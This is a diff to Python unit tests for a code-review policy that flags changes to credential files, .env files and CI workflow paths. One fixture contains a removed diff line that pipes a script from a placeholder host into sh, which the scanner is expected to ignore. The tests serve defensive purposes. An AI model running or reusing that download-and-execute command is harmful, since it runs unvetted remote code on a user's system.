@@ -23,7 +23,7 @@ class NativeReviewerPolicyTests(unittest.TestCase):
                 self.assertEqual(finding.severity, "high")
 
     def test_private_credentials_and_environment_files_are_critical(self):
-        for path in ("keys/signing.pem", "config/client.key", ".env.production"):
+        for path in ("keys/signing.pem", "config/client.key", ".env.production", ".env"):
             with self.subTest(path=path):
                 finding = classify_changed_path(path)
                 self.assertIsNotNone(finding)
@@ -67,6 +67,11 @@ class NativeReviewerPolicyTests(unittest.TestCase):
             "-curl https://example.invalid/install.sh | sh\n"
         )
         self.assertEqual(scan_added_lines(diff), [])
+
+    def test_hidden_control_plane_path_is_not_normalized_away(self):
+        finding = classify_changed_path(".github/workflows/release.yml")
+        self.assertIsNotNone(finding)
+        self.assertEqual(finding.code, "protected-control-plane-change")
 
     def test_clean_documentation_path_is_not_flagged(self):
         self.assertIsNone(classify_changed_path("docs/AI_REVIEW.md"))
